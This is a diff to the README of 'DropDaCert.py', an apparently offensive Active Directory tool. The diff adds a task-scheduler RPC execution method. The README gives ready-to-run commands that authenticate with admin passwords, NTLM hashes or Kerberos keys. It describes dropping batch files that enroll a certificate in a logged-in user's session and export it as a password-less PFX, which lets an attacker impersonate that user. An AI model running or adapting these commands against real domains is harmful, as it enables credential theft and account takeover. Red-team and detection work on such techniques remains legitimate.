@@ -83,6 +83,9 @@ python3 DropDaCert.py corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
 # SMB exec (no WinRM needed)
 python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
 
+# TSCH RPC exec (no WinRM, no service binary — just SMB + task scheduler RPC)
+python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method tsch
+
 # Manual mode — generate files and print instructions only
 python3 DropDaCert.py admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
 
@@ -101,7 +104,7 @@ python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv
 | `-H [LM:]NT` | NTLM hash |
 | `-k` | Kerberos auth |
 | `--aes-key HEX` | AES key for Kerberos |
-| `--exec-method` | `winrm` (default), `smb`, `manual` |
+| `--exec-method` | `winrm` (default), `smb`, `tsch`, `manual` |
 | `--exec-wrapper` | `conhost` (default), `cmd`, `powershell`, `wscript` |
 | `--drop-dir` | Remote drop directory (default: `C:\Windows\Tasks`) |
 | `--template` | Certificate template (default: `User`) |
@@ -111,9 +114,9 @@ python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv
 
 ## How it works
 
-1. Connects via WinRM (default) or SMB (psexecsvc)
-2. Enumerates active sessions and resolves domain via WMI
-3. Uploads `cert.inf`, `cert.bat`, `cert.xml` via SMB
+1. Connects via WinRM (default), SMB (psexecsvc), or TSCH (direct task scheduler RPC)
+2. Enumerates active sessions (WMI for WinRM/SMB, WKSSVC RPC for TSCH)
+3. Uploads `cert.inf` and `cert.bat` via SMB
 4. Creates scheduled task — runs in the target user's session context
 5. `cert.bat` runs `certreq` to enroll, exports PFX with empty password
 6. Polls for PFX via SMB, downloads it
